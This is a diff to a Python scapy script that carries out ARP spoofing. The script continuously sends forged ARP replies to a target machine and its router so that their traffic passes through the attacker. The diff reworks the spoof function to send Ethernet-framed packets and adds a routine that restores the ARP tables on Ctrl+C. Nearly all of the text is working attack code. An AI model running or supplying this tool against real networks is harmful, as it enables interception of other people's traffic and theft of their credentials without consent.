@@ -13,10 +13,21 @@ def get_mac(ip):
     return mac
 
 
-def spoof(target_ip, spoof_ip):
-    target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
+def spoof(source_ip, dest_ip):
+    mac = get_mac(source_ip)
+    ether = scapy.Ether(dst=mac)
+    arp = scapy.ARP(op=2, psrc=dest_ip, pdst=source_ip, hwdst=mac)
+    packet = ether / arp
     scapy.sendp(packet, verbose=False)
+
+
+def restore(source, dest):
+    destination_mac = get_mac(dest)
+    source_mac = get_mac(source)
+    ether = scapy.Ether(dst=source_mac)
+    arp_restore = scapy.ARP(op=2,pdst=dest,hwdst=destination_mac,psrc=source,hwsrc=source_mac)
+    packet = ether / arp_restore
+    scapy.sendp(packet, count=4, verbose=False)
 
 
 def get_ip_address():
@@ -33,16 +44,18 @@ def get_ip_address():
 
 def run():
     try:
-        target_ip, router_ip = get_ip_address()
+        source_ip, router_ip = get_ip_address()
         packets_sent_count = 0
         while True:
-            spoof(target_ip, router_ip)
-            spoof(router_ip, target_ip)
+            spoof(source_ip, router_ip)
+            spoof(router_ip, source_ip)
             packets_sent_count += 2
             print(f"\r[+] Packets Sent: {packets_sent_count}", end="")
             time.sleep(2)
     except KeyboardInterrupt:
-        print("\n\n[-]Detected Ctrl+C ..... Exiting!")
+        print("\n\n[-] Detected Ctrl+C ..... Exiting!")
+        restore(source_ip, router_ip)
+        restore(router_ip, source_ip)
 
 
 run()
